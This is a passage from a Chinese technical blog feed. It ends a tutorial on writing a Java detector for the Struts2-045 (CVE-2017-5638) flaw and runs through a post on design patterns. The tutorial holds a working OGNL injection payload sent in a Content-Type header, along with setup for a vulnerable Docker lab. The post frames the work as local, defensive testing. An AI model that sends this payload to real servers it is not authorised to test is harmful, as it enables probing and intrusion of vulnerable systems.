punctuation">(</span>openConnection<span class="token punctuation">.</span><span class="token function">getInputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            String line <span class="token operator">=</span> null<span class="token punctuation">;</span>            <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>line <span class="token operator">=</span> reader<span class="token punctuation">.</span><span class="token function">readLine</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token comment" spellcheck="true">// System.out.println(line); // 逐行打印请求</span>                responseBody<span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span>line <span class="token operator">+</span><span class="token string">"\r\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">MalformedURLException</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">IOException</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">return</span> responseBody<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span></code></pre><p>POST 请求:</p><pre class=" language-java"><code class="language-java"><span class="token comment" spellcheck="true">/**     * POST请求     * @param target 网址     * @param params 参数     * @return     */</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> String <span class="token function">sendPost</span><span class="token punctuation">(</span>String target<span class="token punctuation">,</span> String params<span class="token punctuation">)</span> <span class="token punctuation">{</span>        StringBuilder responseBody <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">StringBuilder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 请求的响应内容</span>        BufferedReader reader<span class="token punctuation">;</span>        PrintWriter out<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 输出流</span>        <span class="token keyword">try</span> <span class="token punctuation">{</span>            URL url <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">URL</span><span class="token punctuation">(</span>target<span class="token punctuation">)</span><span class="token punctuation">;</span>            URLConnection openConnection <span class="token operator">=</span> url<span class="token punctuation">.</span><span class="token function">openConnection</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            openConnection<span class="token punctuation">.</span><span class="token function">setDoInput</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 默认为true，可以使用openConnection.getInputStream() 取得响应</span>            openConnection<span class="token punctuation">.</span><span class="token function">setDoOutput</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 默认为false, 设置为true后可以使用openConnection.getOutputStream() 进行写入数据</span>            out <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">PrintWriter</span><span class="token punctuation">(</span>openConnection<span class="token punctuation">.</span><span class="token function">getOutputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            out<span class="token punctuation">.</span><span class="token function">print</span><span class="token punctuation">(</span>params<span class="token punctuation">)</span><span class="token punctuation">;</span>            out<span class="token punctuation">.</span><span class="token function">flush</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            reader <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">BufferedReader</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">InputStreamReader</span><span class="token punctuation">(</span>openConnection<span class="token punctuation">.</span><span class="token function">getInputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            String line <span class="token operator">=</span> null<span class="token punctuation">;</span>            <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>line <span class="token operator">=</span> reader<span class="token punctuation">.</span><span class="token function">readLine</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token comment" spellcheck="true">// System.out.println(line); // 逐行打印请求</span>                responseBody<span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span>line <span class="token operator">+</span><span class="token string">"\r\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">MalformedURLException</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">IOException</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">return</span> responseBody<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span></code></pre><p>执行测试：</p><pre class=" language-java"><code class="language-java"><span class="token annotation punctuation">@Test</span>    <span class="token keyword">void</span> <span class="token function">testRequest</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"GET请求:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        String getTarget <span class="token operator">=</span> <span class="token string">"https://www.baidu.com/"</span><span class="token punctuation">;</span>        String getResponseBody <span class="token operator">=</span> Req<span class="token punctuation">.</span><span class="token function">sendGet</span><span class="token punctuation">(</span>getTarget<span class="token punctuation">)</span><span class="token punctuation">;</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>getResponseBody<span class="token punctuation">)</span><span class="token punctuation">;</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"POST请求:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        String postTarget <span class="token operator">=</span> <span class="token string">"http://127.0.0.1:9999/user/checkLogin.do"</span><span class="token punctuation">;</span>        String params <span class="token operator">=</span> <span class="token string">"account=admin&amp;password=admin"</span><span class="token punctuation">;</span>        String postResponseBody <span class="token operator">=</span> Req<span class="token punctuation">.</span><span class="token function">sendPost</span><span class="token punctuation">(</span>postTarget<span class="token punctuation">,</span> params<span class="token punctuation">)</span><span class="token punctuation">;</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>postResponseBody<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span></code></pre><p><img src="https://img-blog.csdn.net/20180802214436325?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2ltbW9ydGFsaXR5V2FuZw==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70" alt="这里写图片描述"></p><p>&emsp;有了以上的概念和认识后，我们实际编写一个案例，开发一个检测Struts2-045命令执行的检测工具，因为是st2-045漏洞是因为使用Jakarta上传文件对Content-Type判断和处理不档引起的，所以漏洞利用的poc是要作用在请求头中的Centent-Type才能生效的。所以我们需要在小小的修改一下post请求.</p><pre class=" language-java"><code class="language-java"><span class="token comment" spellcheck="true">/**     * Post请求     * @param target 网址     * @param params 参数     * @param headers 请求头     * @return     */</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> String <span class="token function">sendPost</span><span class="token punctuation">(</span>String target<span class="token punctuation">,</span> String params<span class="token punctuation">,</span> Map<span class="token operator">&lt;</span>String<span class="token punctuation">,</span> String<span class="token operator">></span> headers<span class="token punctuation">)</span> <span class="token punctuation">{</span>        StringBuilder responseBody <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">StringBuilder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 请求的响应内容</span>        BufferedReader reader<span class="token punctuation">;</span>        PrintWriter out<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 输出流</span>        <span class="token keyword">try</span> <span class="token punctuation">{</span>            URL url <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">URL</span><span class="token punctuation">(</span>target<span class="token punctuation">)</span><span class="token punctuation">;</span>            URLConnection openConnection <span class="token operator">=</span> url<span class="token punctuation">.</span><span class="token function">openConnection</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">// 设置请求头</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span>Map<span class="token punctuation">.</span>Entry<span class="token operator">&lt;</span>String<span class="token punctuation">,</span> String<span class="token operator">></span> entry <span class="token operator">:</span> headers<span class="token punctuation">.</span><span class="token function">entrySet</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                openConnection<span class="token punctuation">.</span><span class="token function">setRequestProperty</span><span class="token punctuation">(</span>entry<span class="token punctuation">.</span><span class="token function">getKey</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> entry<span class="token punctuation">.</span><span class="token function">getValue</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            openConnection<span class="token punctuation">.</span><span class="token function">setDoInput</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 默认为true，可以使用openConnection.getInputStream() 取得响应</span>            openConnection<span class="token punctuation">.</span><span class="token function">setDoOutput</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 默认为false, 设置为true后可以使用openConnection.getOutputStream() 进行写入数据</span>            out <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">PrintWriter</span><span class="token punctuation">(</span>openConnection<span class="token punctuation">.</span><span class="token function">getOutputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            out<span class="token punctuation">.</span><span class="token function">print</span><span class="token punctuation">(</span>params<span class="token punctuation">)</span><span class="token punctuation">;</span>            out<span class="token punctuation">.</span><span class="token function">flush</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            reader <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">BufferedReader</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">InputStreamReader</span><span class="token punctuation">(</span>openConnection<span class="token punctuation">.</span><span class="token function">getInputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            String line <span class="token operator">=</span> null<span class="token punctuation">;</span>            <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>line <span class="token operator">=</span> reader<span class="token punctuation">.</span><span class="token function">readLine</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token comment" spellcheck="true">// System.out.println(line); // 逐行打印请求</span>                responseBody<span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span>line <span class="token operator">+</span> <span class="token string">"\r\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">MalformedURLException</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">IOException</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">return</span> responseBody<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span></code></pre><p>测试用例：<br>&emsp;&emsp;我们的payload使用ognl向页面打印(println)了一个 “exist045”，所以当 “exist045”存在于响应中的情况下，基本上可以判判断存在漏洞!</p><pre class=" language-java"><code class="language-java"><span class="token annotation punctuation">@Test</span>    <span class="token keyword">void</span> <span class="token function">str045</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        String target <span class="token operator">=</span> <span class="token string">"http://demo.com/index.action"</span><span class="token punctuation">;</span>        String payload <span class="token operator">=</span> <span class="token string">"%{(#nikenb='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#context.setMemberAccess(#dm))))."</span>                <span class="token operator">+</span> <span class="token string">"(#o=@org.apache.struts2.ServletActionContext@getResponse().getWriter()).(#o.println('exist045')).(#o.close())}"</span><span class="token punctuation">;</span>        Map<span class="token operator">&lt;</span>String<span class="token punctuation">,</span> String<span class="token operator">></span> headers <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token operator">&lt;</span><span class="token operator">></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        headers<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"User-Agent"</span><span class="token punctuation">,</span> <span class="token string">"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        headers<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"Content-Type"</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span><span class="token punctuation">;</span>        String postResponseBody <span class="token operator">=</span> Req<span class="token punctuation">.</span><span class="token function">sendPost</span><span class="token punctuation">(</span>target<span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">,</span>headers<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>postResponseBody<span class="token punctuation">.</span><span class="token function">contains</span><span class="token punctuation">(</span><span class="token string">"exist045"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"[*] exist st2-045: "</span><span class="token operator">+</span>target<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span></code></pre><p><img src="https://img-blog.csdn.net/20180802214628527?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2ltbW9ydGFsaXR5V2FuZw==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70" alt="这里写图片描述"></p><p>后节：<br>&emsp;&emsp;测试用例都是本地搭建的环境的，并非随意攻击，所以也需注意，本次使用的环境是使用docker的str2漏洞镜像。为了方便大家测试，现在来说一下如果构建测试用例。<br>我使用的环境是centos-7 + docker 1.8<br>&emsp;&emsp;在这里我推荐大家学习和使用linux和docker，使用docker的优点就在于快速部署，如果正常要搭建一个struts2漏洞的测试环境，我们需要安装jdk,tomcat，下载存在漏洞版本的struts2。经过一步步的繁杂操作后，才能运行起来环境，而使用docker的情况下，搭建环境只要docker pull xxx镜像即可，拉取回来。运行也是一句命令的事情，不会出现因为环境或者其他原因发生各种意外的情况浪费大量时间去解决这些问题。<br>如何安装docker请参考:</p><blockquote><p><a href="https://www.cnblogs.com/yufeng218/p/8370670.html" target="_blank" rel="noopener">https://www.cnblogs.com/yufeng218/p/8370670.html</a></p></blockquote><p>本次使用的用例是在hub.docker找到的一个镜像:</p><blockquote><p><a href="https://hub.docker.com/r/piesecurity/apache-struts2-cve-2017-5638/" target="_blank" rel="noopener">https://hub.docker.com/r/piesecurity/apache-struts2-cve-2017-5638/</a></p></blockquote><p><img src="https://img-blog.csdn.net/20180802214809787?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2ltbW9ydGFsaXR5V2FuZw==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70" alt="这里写图片描述"></p><p>复制命令到安装有docker的机器上执行即可.<br>pull 拉取镜像:</p><pre><code>[root@host ~]# docker pull piesecurity/apache-struts2-cve-2017-5638</code></pre><p>查看所有的docker镜像：</p><pre><code>docker images</code></pre><p>运行docker镜像:</p><ol><li>-d 指定容器运行与前台还是后台，默认为false</li><li>-p 映射端口8080</li><li>（e1440048c3f7 为 IMAGE ID）<pre><code>docker run -d -p 8080:8080 --name st2vuln e1440048c3f7</code></pre><img src="https://img-blog.csdn.net/20180802215057124?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2ltbW9ydGFsaXR5V2FuZw==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70" alt="这里写图片描述"></li></ol><p>运行之后查看当前所有运行着的镜像:</p><pre><code>docker ps</code></pre><p><img src="https://img-blog.csdn.net/2018080221512595?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2ltbW9ydGFsaXR5V2FuZw==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70" alt="这里写图片描述"></p><p>现在就可以通过ip:8080访问这个镜像了!<br><img src="https://img-blog.csdn.net/20180802215145411?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2ltbW9ydGFsaXR5V2FuZw==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70" alt="这里写图片描述"></p><p>本章节并不过多叙述docker的使用，这基础入门章节完结，喜欢的朋友可以关注一下，定期更新系列。</p>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
          <category> 安全工具 </category>
          
          <category> Java安全工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 安全工具编写 </tag>
            
            <tag> web安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>开发及常用框架中常见的设计模式</title>
      <link href="/2020/05/24/kai-fa-ji-chang-yong-kuang-jia-zhong-chang-jian-de-she-ji-mo-shi/"/>
      <url>/2020/05/24/kai-fa-ji-chang-yong-kuang-jia-zhong-chang-jian-de-she-ji-mo-shi/</url>
      
        <content type="html"><![CDATA[<ul><li><a href="#一什么是设计模式">一、什么是设计模式</a></li><li><a href="#二为什么要使用设计模式">二、为什么要使用设计模式？</a></li><li><a href="#三何时使用设计模式">三、何时使用设计模式</a></li><li><a href="#四六大设计原则">四、六大设计原则</a></li><li><a href="#五不遵循设计模式可能会导致的问题">五、不遵循设计模式可能会导致的问题</a></li><li><a href="#六什么是高内聚低耦合强耦合">六、什么是高内聚、低耦合、强耦合</a></li><li><a href="#七业务逻辑中的设计模式及原则">七、业务逻辑中的设计模式及原则</a></li><li><a href="#八框架中的常用设计模式">八、框架中的常用设计模式</a><ul><li><a href="#spring中的常用的设计模式">Spring中的常用的设计模式</a></li><li><a href="#mybatis中常用的设计模式">Mybatis中常用的设计模式</a></li><li><a href="#架构中常用的设计模式">架构中常用的设计模式</a></li></ul></li><li><a href="#九设计模式总结">九、设计模式总结</a></li><li><a href="#十实现和继承的区别和联系">十、实现和继承的区别和联系</a></li><li><a href="#十一soa和微服务的关联及区别">十一、SOA和微服务的关联及区别</a></li></ul><h2 id="一、什么是设计模式"><a href="#一、什么是设计模式" class="headerlink" title="一、什么是设计模式"></a>一、什么是设计模式</h2><p><strong>定义：</strong>是一套被反复使用的，多数人知晓的、经过分类编目的、代码设计经验总结<br><strong>特性一：</strong>面向对象<br><strong>特性二：</strong>与具体的语言无关</p><h2 id="二、为什么要使用设计模式？"><a href="#二、为什么要使用设计模式？" class="headerlink" title="二、为什么要使用设计模式？"></a>二、为什么要使用设计模式？</h2><ul><li>可扩展</li><li>可复用</li><li>可维护</li><li><code>抽象类</code>提高了类和类的内聚程度，减少了代码量。</li></ul><h2 id="三、何时使用设计模式"><a href="#三、何时使用设计模式" class="headerlink" title="三、何时使用设计模式"></a>三、何时使用设计模式</h2><ul><li>有一定代码编写经验和理解后</li><li>合适场景+匹配问题+清晰的解决方案<blockquote><p>$\color{green}{固定的业务常见下+匹配的问题=场景问题}$</p></blockquote></li><li><code>重构</code>：通过调整代码结构改善软件的质量、性能、使其程序的设计模式和架构更趋合理，提高软件的扩展性和可维护性。</li></ul><h2 id="四、六大设计原则"><a href="#四、六大设计原则" class="headerlink" title="四、六大设计原则"></a>四、六大设计原则</h2><ul><li><strong>单一职责原则 SRP</strong><ul><li>有且仅有一个原因能引起类变化</li><li>用职责或变化和衡量</li></ul></li><li><strong>里氏替换原则</strong><ul><li>所有引用基类的地方必须能无感知的使用其子类</li><li>子类可扩展父类功能，但不要修改父类功能</li></ul></li><li><strong>依赖倒置原则</strong><ul><li>面向接口编程</li></ul></li><li><strong>接口隔离原则</strong><ul><li>接口尽量细化，化为最小功能单元</li><li>不使用接口不要依赖</li></ul></li><li><strong>迪米特法则</strong><ul><li>也叫最少知道原则，一个对象对其他对象有最少的了解</li><li>Only talk to your Immediate friends</li><li>依赖、关联、聚合、组合</li></ul></li><li><strong>开闭原则</strong><ul><li>对扩展开放，对修改关闭</li><li>抽象约束，封装变化</li></ul></li></ul><h2 id="五、不遵循设计模式可能会导致的问题"><a href="#五、不遵循设计模式可能会导致的问题" class="headerlink" title="五、不遵循设计模式可能会导致的问题"></a>五、不遵循设计模式可能会导致的问题</h2><p><code>技术负债</code>：</p><p>例1：</p><blockquote><p>小明需要开开发一个用户模块，其中涉及一些复杂的操作，比如用户数据接收和处理，这时小明为了省事，把多个模块之间需要交互的代码都融合到了一起，将原本需要2天的工作量，用了1天完成了。<br>但过了段时间，项目升级迭代，涉及接收用户数据的部分有了大的变动，这时因为原本的代码不遵循任何规范，乱糟糟的在一起，需要进行大面积的修改，甚至是删掉重写，此时工作量翻了不止倍，小明给自己挖了个巨坑，需要加班加点的填坑！</p></blockquote><p>例2：</p><blockquote><p>一个服务节点 5000QPS，小明在写程序的时候，处理的非常差，导致1一个节点只能有1000QPS，这时需要处理5000QPS，就需要使用5台机器才能解决问题，这就导致了成本增加</p></blockquote><h2 id="六、什么是高内聚、低耦合、强耦合"><a href="#六、什么是高内聚、低耦合、强耦合" class="headerlink" title="六、什么是高内聚、低耦合、强耦合"></a>六、什么是高内聚、低耦合、强耦合</h2><p><code>高内聚</code>：A模块以及拥有它应该拥有的所有功能，不需要依赖其他的模块，拆到不能再拆（微服务的最小服务、最小原子操作）</p><p><code>低耦合</code>：模块之间依赖程度较低，某一个模块变动或者是出故障的时候   </p><blockquote><p>例如：A模块依赖B模块，B接口依赖，B出问题，A不受影响，这是低耦合</p><p>但是如果，A同时受到影响，不能正常运行，这就是<code>强耦合</code></p></blockquote><h2 id="七、业务逻辑中的设计模式及原则"><a href="#七、业务逻辑中的设计模式及原则" class="headerlink" title="七、业务逻辑中的设计模式及原则"></a>七、业务逻辑中的设计模式及原则</h2><ul><li><p><strong>单一职责原则</strong></p><p> 业务分层（水平+垂直）Spring MVC、Controller、Service、Dao</p></li><li><p><strong>依赖导致原则</strong></p><p>  Service、Dao等，都有接口和Impl实现类</p></li><li><p><strong>迪米特法则</strong></p><p>  水平分层，如Controller和Service</p></li><li><p><strong>多种模式组合使用</strong></p><p>  Dao层：Facade外观模式、Proxy代理模式、Strategy策略模式</p><p>  Service层：业务自定义</p></li></ul><h2 id="八、框架中的常用设计模式"><a href="#八、框架中的常用设计模式" class="headerlink" title="八、框架中的常用设计模式"></a>八、框架中的常用设计模式</h2><h3 id="Spring中的常用的设计模式"><a href="#Spring中的常用的设计模式" class="headerlink" title="Spring中的常用的设计模式"></a>Spring中的常用的设计模式</h3><ul><li><p>Factory Pattern 工厂模式</p><ul><li>BeanFactory</li><li>ApplicationContext</li></ul></li><li><p>Singleton 单例模式</p><ul><li>ApplicationContext</li></ul></li><li><p>Prototype原型模式</p><ul><li>scope = prototype</li></ul></li><li><p>Proxy Pattern 代理模式</p><ul><li>AOP</li></ul></li><li><p>Delegate Proxy委派模式</p><ul><li>DispatchServlet</li><li>BeanDefinitionParserDelegate</li></ul></li><li><p>Observer Pattern 观察者模式</p><ul><li>ContextLoaderListener</li></ul></li><li><p>Adapter 适配器模式</p><ul><li>HandlerAdapter</li></ul></li><li><p>Other Pattern 其他设计模式</p><ul><li>策略模式、模板方法模式</li></ul></li></ul><h3 id="Mybatis中常用的设计模式"><a href="#Mybatis中常用的设计模式" class="headerlink" title="Mybatis中常用的设计模式"></a>Mybatis中常用的设计模式</h3><ul><li>工厂模式<ul><li>SqlSessionFactory</li></ul></li><li>单例模式<ul><li>SqlSessionFactory</li></ul></li><li>代理模式<ul><li>MapperProxy、ConnectionLogger等用了动态代理</li></ul></li><li>模板方法模式<ul><li>BaseExecutor、SimpleExecutor、BaseTypeHandler</li></ul></li><li>装饰者模式<ul><li>cache包里decorators下的所有decorators实现类</li></ul></li><li>迭代器模式<ul><li>PropertyTokenizer</li></ul></li></ul><h3 id="架构中常用的设计模式"><a href="#架构中常用的设计模式" class="headerlink" title="架构中常用的设计模式"></a>架构中常用的设计模式</h3><ul><li>MVC模式</li><li>黑板模式</li><li>主从模式</li><li>SOA模式</li><li>微服务模式</li></ul><h2 id="九、设计模式总结"><a href="#九、设计模式总结" class="headerlink" title="九、设计模式总结"></a>九、设计模式总结</h2><table><thead><tr><th>经验复用</th><th>可扩展</th><th>逻辑中</th></tr></thead><tbody><tr><td>可自创</td><td>可复用</td><td>工具及框架中</td></tr><tr><td>解决问题</td><td>可我IE胡</td><td>架构中</td></tr></tbody></table><blockquote><p>UML图一定要会画，面试时如果问到设计模式，画UML是必经过程</p></blockquote><h2 id="十、实现和继承的区别和联系"><a href="#十、实现和继承的区别和联系" class="headerlink" title="十、实现和继承的区别和联系"></a>十、实现和继承的区别和联系</h2><blockquote><p>首先我们都知道Java是单继承、多实现</p></blockquote><p><strong>extends：</strong>一个类继承了父类，则拥有父类的所有非私有功能，它是有具体实现功能的，所有子类从父类继承的方法都是<code>同样的行为</code></p><p><strong>Implement：</strong>接口，比较抽象，是只做定义，具有的功能交于实现类去根据需要进行<code>不同行为</code>的实现</p><h2 id="十一、SOA和微服务的关联及区别"><a href="#十一、SOA和微服务的关联及区别" class="headerlink" title="十一、SOA和微服务的关联及区别"></a>十一、SOA和微服务的关联及区别</h2><p>这里说下我对SOA和微服务的理解，由于没有实际经营，如有问题，还请多多指教！</p><p><strong>SOA：</strong>主要在于解决多服务之间相互调用的问题，也就是服务治理，根据职能将模块抽取出来，提供一个公共服务供多个模块进行调用，着重中央管理。</p><p><strong>微服务：</strong>每个服务都是聚焦单个小型的业务功能，私有的数据库，数据去中心化，降低服务直接的耦合度，每个服务都可以独立部署，它是<code>高内聚</code>、<code>松耦合</code>着重分散管理</p><p><br/><br/></p><h3 id="color-green-学习参考地址-Java大型互联网架构师进阶课程：-https-ke-qq-com-course-435990"><a href="#color-green-学习参考地址-Java大型互联网架构师进阶课程：-https-ke-qq-com-course-435990" class="headerlink" title="$\color{green}{学习参考地址 Java大型互联网架构师进阶课程：}$https://ke.qq.com/course/435990"></a>$\color{green}{学习参考地址 Java大型互联网架构师进阶课程：}$<a href="https://ke.qq.com/course/435990" target="_blank" rel="noopener">https://ke.qq.com/course/435990</a></h3><p><br/><br/></p>]]></content>
      
      
      <categories>
          
          <category> 设计模式 </category>
          
          <category> Spring设计模式 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 设计模式 </tag>
            
            <tag> 六大设计原则 </tag>
            
            <tag> Spring设计模式 </tag>
            
            <tag> 高内聚 </tag>
            
            <tag> 低耦合 </tag>
            
            <tag> 强耦合 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Spring基础及相关知识概述</title>
      <link href="/2020/05/24/spring-ji-chu-ji-xiang-guan-zhi-shi-gai-shu/"/>
      <url>/2020/05/24/spring-ji-chu-ji-xiang-guan-zhi-shi-gai-shu/</url>
      
